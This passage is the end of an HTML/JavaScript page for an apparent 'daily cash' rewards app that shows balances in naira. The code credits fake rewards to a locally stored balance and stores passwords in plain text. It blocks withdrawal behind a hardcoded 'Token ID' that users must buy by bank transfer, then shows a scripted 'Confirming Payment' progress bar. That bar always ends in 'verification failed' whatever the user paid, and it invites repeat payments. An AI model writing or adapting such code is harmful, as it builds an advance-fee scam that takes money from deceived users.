                <div class="note">Make Payment to the Account Above to get your Token ID</div>

                <button class="confirm-btn" onclick="goToVerification()">I have made this bank Transfer</button>
              </div>
            </div>

            <div id="screen4" class="screen">
              <div id="screen4-loading">
                <div class="header">Confirming Payment</div>
                <div class="loader-container">
                  <div class="loader"></div>
                  <h2>Confirming Your Payment</h2>
                  <p>Please wait while we verify your transaction...</p>
                  <div class="progress-bar-container">
                    <div class="progress-bar" id="verification-progress-bar"></div>
                  </div>
                  <p class="note">This may take a few moments<br/>Please do not close this page</p>
                </div>
              </div>

              <div id="screen4-failed">
                <div class="failed-container">
                  <div class="icon-circle">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                      <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
                    </svg>
                  </div>
                  <h1>Transaction verification failed!</h1>
                  <p>Your payment could not be completed.<br>Reason: No Payment received from you or Invalid payment method.</p>
                  <div class="contact-info">
                    If you need help contact us
                    <div class="email-wrapper">
                      <a id="contactEmail" href="mailto:dailycashapp96@gmail.com">dailycashapp96@gmail.com</a>
                      <svg class="copy-icon" id="copyEmailIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                      </svg>
                    </div>
                  </div>
                  <button class="button primary" id="tryAgainButton">Try Again</button>
                  <a href="#" class="button secondary" id="failed-go-to-dashboard">Go to Dashboard</a>
                </div>
              </div>
            </div>
        </div>
    </div>

    <div id="loading-overlay" class="loading-screen hidden">
        <div class="loading-spinner"></div>
        <p class="mt-4 text-lg text-gray-600">Registering...</p>
    </div>

    <script>
        const registrationForm = document.getElementById('registration-form');
        const loginForm = document.getElementById('login-form');
        const formTitle = document.getElementById('form-title');
        const toggleText = document.getElementById('toggle-text');
        const authSection = document.getElementById('auth-section');
        const dashboardContainer = document.getElementById('dashboard-container');
        const loadingOverlay = document.getElementById('loading-overlay');
        const mainAppContainer = document.getElementById('main-app-container');
        const withdrawalContainer = document.getElementById('withdrawal-container');
        const withdrawalBtn = document.getElementById('withdrawal-btn');
        const withdrawalBackArrow = document.getElementById('withdrawal-back-arrow');
        const withdrawalFormSection = document.getElementById('withdrawal-form-section');
        const successSection = document.getElementById('success-section');
        const buyTokenLink = document.getElementById('buy-token-link');
        const modalBuyTokenBtn = document.getElementById('modal-buy-token-button');
        const buyTokenSection = document.getElementById('buy-token-section');

        // New elements for the upgraded code
        const regFullnameInput = document.getElementById('reg-fullname');
        const regEmailInput = document.getElementById('reg-email');
        const regPasswordInput = document.getElementById('reg-password');
        const regErrorMessage = document.getElementById('reg-error-message');

        const loginEmailInput = document.getElementById('login-email');
        const loginPasswordInput = document.getElementById('login-password');
        const loginErrorMessage = document.getElementById('login-error-message');

        const userGreetingEl = document.getElementById('user-greeting');
        const userIconInitialEl = document.getElementById('user-icon-initial');

        // Check for a logged-in user on page load
        let loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
        if (loggedInUser) {
            authSection.classList.add('hidden');
            dashboardContainer.style.display = 'block';
            mainAppContainer.style.display = 'block';
            initializeDashboard(loggedInUser);
        } else {
            mainAppContainer.style.display = 'block';
        }

        // Handle navigation to the withdrawal page
        // MODIFIED: This event listener now also ensures all withdrawal-related sections are hidden,
        // so clicking "Withdrawal" will always open a fresh withdrawal form.
        withdrawalBtn.addEventListener('click', function() {
            mainAppContainer.style.display = 'none';
            withdrawalContainer.style.display = 'flex';
            withdrawalFormSection.style.display = 'block';
            successSection.style.display = 'none';
        });

        withdrawalBackArrow.addEventListener('click', function() {
            withdrawalContainer.style.display = 'none';
            mainAppContainer.style.display = 'block';
        });

        function toggleToLogin(message) {
            regErrorMessage.textContent = message;
            regErrorMessage.classList.remove('hidden');

            // Switch to login form
            registrationForm.classList.add('hidden');
            loginForm.classList.remove('hidden');
            formTitle.textContent = "Welcome back";
            toggleText.innerHTML = "Don't have an account? <a id='toggle-link' href='#' class='text-orange-500 font-medium hover:underline'>Register</a>";
            loginEmailInput.value = regEmailInput.value;
            setupToggleListener();
        }

        // Handle registration
        registrationForm.addEventListener('submit', function(event) {
            event.preventDefault();
            regErrorMessage.classList.add('hidden');

            const fullname = regFullnameInput.value.trim();
            const email = regEmailInput.value.trim();
            const password = regPasswordInput.value;

            // Basic validation
            if (!fullname || !email || !password) {
                regErrorMessage.textContent = 'All fields are required.';
                regErrorMessage.classList.remove('hidden');
                return;
            }

            // Simple email format check
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                regErrorMessage.textContent = 'Please enter a valid email address.';
                regErrorMessage.classList.remove('hidden');
                return;
            }

            // Get users from local storage or initialize an empty object
            let users = JSON.parse(localStorage.getItem('users')) || {};

            // Check if email already exists
            if (users[email]) {
                regErrorMessage.textContent = 'This email is already registered. Please log in.';
                regErrorMessage.classList.remove('hidden');
                toggleToLogin('This email is already registered. Please log in.');
                return;
            }

            // Show loading screen
            loadingOverlay.classList.remove('hidden');
            loadingOverlay.querySelector('p').textContent = 'Registering...';

            setTimeout(() => {
                // Save user data
                users[email] = { fullname, password };
                localStorage.setItem('users', JSON.stringify(users));

                // Set this user as logged in
                const userData = { fullname, email };
                localStorage.setItem('loggedInUser', JSON.stringify(userData));

                loadingOverlay.style.opacity = '0';
                setTimeout(() => {
                    loadingOverlay.classList.add('hidden');
                    loadingOverlay.style.opacity = '1';
                    authSection.classList.add('hidden');
                    dashboardContainer.style.display = 'block';
                    initializeDashboard(userData);
                }, 500);
            }, 3000);
        });

        // Handle login
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            loginErrorMessage.classList.add('hidden');

            const email = loginEmailInput.value.trim();
            const password = loginPasswordInput.value;

            let users = JSON.parse(localStorage.getItem('users')) || {};

            if (!users[email] || users[email].password !== password) {
                loginErrorMessage.textContent = 'Invalid email or password.';
                loginErrorMessage.classList.remove('hidden');
                return;
            }

            // Show loading screen
            loadingOverlay.classList.remove('hidden');
            loadingOverlay.querySelector('p').textContent = 'Logging in...';

            setTimeout(() => {
                // Set this user as logged in
                const userData = { fullname: users[email].fullname, email: email };
                localStorage.setItem('loggedInUser', JSON.stringify(userData));

                loadingOverlay.style.opacity = '0';
                setTimeout(() => {
                    loadingOverlay.classList.add('hidden');
                    loadingOverlay.style.opacity = '1';
                    authSection.classList.add('hidden');
                    dashboardContainer.style.display = 'block';
                    initializeDashboard(userData);
                }, 500);
            }, 3000);
        });


        function setupToggleListener() {
            const currentToggleLink = document.getElementById('toggle-link');
            if (currentToggleLink) {
                currentToggleLink.addEventListener('click', function(event) {
                    event.preventDefault();
                    regErrorMessage.classList.add('hidden');
                    loginErrorMessage.classList.add('hidden');

                    if (!registrationForm.classList.contains('hidden')) {
                        registrationForm.classList.add('hidden');
                        loginForm.classList.remove('hidden');
                        formTitle.textContent = "Welcome back";
                        toggleText.innerHTML = "Don't have an account? <a id='toggle-link' href='#' class='text-orange-500 font-medium hover:underline'>Register</a>";
                    } else {
                        loginForm.classList.add('hidden');
                        registrationForm.classList.remove('hidden');
                        formTitle.textContent = "Register to continue";
                        toggleText.innerHTML = "Already have an account? <a id='toggle-link' href='#' class='text-orange-500 font-medium hover:underline'>Login</a>";
                    }

                    setupToggleListener();
                });
            }
        }
        setupToggleListener();


        // --- UPGRADED Daily Rewards Logic ---
        function initializeDashboard(userData) {
            const daysGrid = document.querySelector('.days-grid');
            const days = document.querySelectorAll('.day-box');
            const popup = document.getElementById('popup');
            const okBtn = document.getElementById('okBtn');
            const popupAmount = document.getElementById('popupAmount');
            const popupAmountText = document.getElementById('popupAmountText');
            const balanceEl = document.getElementById('balance');
            const hiPopNotification = document.getElementById('hi-pop-notification');
            const emailKey = 'rewards_' + userData.email;

            // Set the user's name and icon
            const firstName = userData.fullname.split(' ')[0];
            userGreetingEl.textContent = `Hi, ${firstName} ðŸ‘‹`;
            userIconInitialEl.textContent = firstName.charAt(0).toUpperCase();

            // Load data from localStorage
            let rewardsData = JSON.parse(localStorage.getItem(emailKey)) || {
                claimedDays: {},
                balance: 0,
                lastClaimTimestamp: null
            };

            // Function to save data to localStorage
            const saveData = () => {
                localStorage.setItem(emailKey, JSON.stringify(rewardsData));
            };

            // Update UI based on loaded data
            balanceEl.textContent = 'â‚¦' + rewardsData.balance.toLocaleString();

            const updateUI = () => {
                const now = Date.now();
                const lastClaimTime = rewardsData.lastClaimTimestamp;
                const claimedDayCount = Object.keys(rewardsData.claimedDays).length;
                const nextDayIndex = claimedDayCount;
                const canClaimToday = !lastClaimTime || (now - lastClaimTime >= 24 * 60 * 60 * 1000);

                days.forEach((day, index) => {
                    day.classList.remove('active', 'claimed', 'disabled');
                    day.onclick = null; // Clear existing event listeners

                    // Set styling and functionality based on state
                    if (rewardsData.claimedDays[index]) {
                        day.classList.add('claimed');
                    } else if (index === nextDayIndex) {
                        day.classList.add('active');
                        if (canClaimToday) {
                            day.onclick = () => { showPopup(index, day.dataset.amount); };
                        } else {
                            day.onclick = () => { showHiPopNotification(); };
                        }
                    } else {
                        day.classList.add('disabled');
                        day.onclick = () => { 
                            if (index < nextDayIndex) {
                                // Already claimed, show nothing
                            } else {
                                // Trying to skip a day, show nothing
                            }
                        };
                    }
                });
            };

            const showPopup = (index, amount) => {
                popupAmount.textContent = parseInt(amount).toLocaleString();
                popupAmountText.textContent = parseInt(amount).toLocaleString();
                popup.dataset.index = index;
                popup.style.display = 'flex';
            };

            const showHiPopNotification = () => {
                hiPopNotification.classList.add('show');
                setTimeout(() => {
                    hiPopNotification.classList.remove('show');
                }, 3000);
            };

            okBtn.addEventListener('click', () => {
                const index = parseInt(popup.dataset.index);
                const amount = parseInt(days[index].dataset.amount);
                
                // Update rewards data
                rewardsData.balance += amount;
                rewardsData.claimedDays[index] = Date.now();
                rewardsData.lastClaimTimestamp = Date.now();
                saveData();

                // Update UI and hide popup
                balanceEl.textContent = 'â‚¦' + rewardsData.balance.toLocaleString();
                popup.style.display = 'none';
                updateUI();
            });

            // Initial UI update on page load
            updateUI();
        }

        // Scripts for the withdrawal section
        document.getElementById('withdraw-button').addEventListener('click', function() {
            const correctToken = 'DC@35171';
            const userToken = document.getElementById('token-id').value;

            if (userToken === correctToken) {
                withdrawalFormSection.style.display = 'none';
                successSection.style.display = 'flex';

                const accountName = document.getElementById('account-name').value;
                const accountNumber = document.getElementById('account-number').value;
                const bank = document.getElementById('bank-select').value;
                const amountValue = parseFloat(document.getElementById('amount').value.replace(/,/g, '')) || 0;

                const formattedAmount = amountValue.toLocaleString('en-NG', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

                document.getElementById('success-amount').textContent = `â‚¦${formattedAmount}`;
                document.getElementById('success-bank').textContent = bank;
                document.getElementById('success-account-number').textContent = accountNumber;
                document.getElementById('success-account-name').textContent = accountName;
                document.getElementById('success-amount-details').textContent = `â‚¦${formattedAmount}`;

            } else {
                document.getElementById('token-modal').style.display = 'flex';
            }
        });

        document.getElementById('close-modal-icon').addEventListener('click', function() {
            document.getElementById('token-modal').style.display = 'none';
        });

        document.getElementById('done-button').addEventListener('click', function() {
            successSection.style.display = 'none';
            withdrawalFormSection.style.display = 'block';
        });

        // Functions for the "Buy Token ID" code
        function showBuyTokenSection() {
            withdrawalFormSection.style.display = 'none';
            successSection.style.display = 'none';
            document.getElementById('token-modal').style.display = 'none'; // Close modal if open
            buyTokenSection.style.display = 'flex';
        }

        function hideBuyTokenSection() {
            buyTokenSection.style.display = 'none';
            withdrawalFormSection.style.display = 'block';
        }

        buyTokenLink.addEventListener('click', function(event) {
            event.preventDefault();
            showBuyTokenSection();
        });

        modalBuyTokenBtn.addEventListener('click', function() {
            showBuyTokenSection();
        });

        // The second code's original scripts
        let verificationInterval;

        function showScreen(screenId) {
            const screens = document.querySelectorAll("#buy-token-section .screen");
            screens.forEach(screen => {
                screen.classList.remove("active");
                if (screen.id === "screen4") {
                    document.getElementById('screen4-loading').style.display = 'none';
                    document.getElementById('screen4-failed').style.display = 'none';
                }
            });
            document.getElementById(screenId).classList.add("active");
            if (screenId === "screen4") {
                document.getElementById('screen4-loading').style.display = 'block';
            }
        }

        function goToLoading() {
            const fullName = document.getElementById("fullName").value.trim();
            const email = document.getElementById("emailAddress").value.trim();

            if (!fullName || !email) {
                alert("Please enter your full name and email before proceeding.");
                return;
            }

            // Switch to loading screen
            document.getElementById("screen1").classList.remove("active");
            document.getElementById("screen2").classList.add("active");

            // Show loading for 3 seconds, then show notice
            setTimeout(() => {
                showOpayNotice(fullName, email);
            }, 3000);
        }

        function showOpayNotice(name, email) {
            const overlay = document.createElement("div");
            overlay.className = "opay-notice-overlay";

            const popup = document.createElement("div");
            popup.className = "opay-notice-popup";
            popup.innerHTML = `
                <h2>Important Notice</h2>
                <p>
                    Please do <b>NOT</b> make your payment with <b>Opay</b>.<br><br>
                    Opay service is currently down. If you make your payment using Opay, your payment may not be confirmed.<br><br>
                    If you must use Opay, transfer the money to another bank and use that bank account to make your payment.
                </p>
                <button id="continueToBank">I Understand</button>
            `;

            overlay.appendChild(popup);
            document.body.appendChild(overlay);

            document.getElementById("continueToBank").onclick = function() {
                document.body.removeChild(overlay);
                document.getElementById("screen2").classList.remove("active");
                document.getElementById("screen3").classList.add("active");
                document.getElementById("userEmail").textContent = email;
            };
        }

        function copyToClipboard(id) {
            const text = document.getElementById(id).innerText;
            navigator.clipboard.writeText(text).then(() => {
                alert("Copied: " + text);
            }).catch(err => {
                console.error('Failed to copy text: ', err);
                alert('Failed to copy. Please copy manually.');
            });
        }

        function goToVerification() {
            showScreen("screen4");
            document.getElementById('screen4-loading').style.display = 'block';
            document.getElementById('screen4-failed').style.display = 'none';
            startVerificationProgressBar();
        }

        function startVerificationProgressBar() {
            let progress = 0;
            const progressBar = document.getElementById('verification-progress-bar');
            progressBar.style.width = '0%';

            if (verificationInterval) {
                clearInterval(verificationInterval);
            }

            verificationInterval = setInterval(() => {
                if (progress < 100) {
                    progress += 1;
                    progressBar.style.width = progress + '%';
                } else {
                    clearInterval(verificationInterval);
                    document.getElementById('screen4-loading').style.display = 'none';
                    document.getElementById('screen4-failed').style.display = 'flex';
                }
            }, 100);
        }

        // NEW: Event listener for the "Go to Dashboard" button on the failed screen
        document.getElementById('failed-go-to-dashboard').addEventListener('click', function(event) {
            event.preventDefault();
            // Hide the buy token section
            buyTokenSection.style.display = 'none';
            // Hide the withdrawal container
            withdrawalContainer.style.display = 'none';
            // Show the main app container (dashboard)
            mainAppContainer.style.display = 'block';
        });

        // NEW: Function to restart the "Buy Token" flow
        function restartBuyTokenFlow() {
            // Hide the failed screen
            document.getElementById('screen4-failed').style.display = 'none';
            // Show the Buy Token payment details screen
            document.getElementById('screen3').classList.add('active');
        }

        // NEW: Event listener for the "Try Again" button
        document.getElementById('tryAgainButton').addEventListener('click', function() {
            restartBuyTokenFlow();
        });
    </script>
</body>
</html>
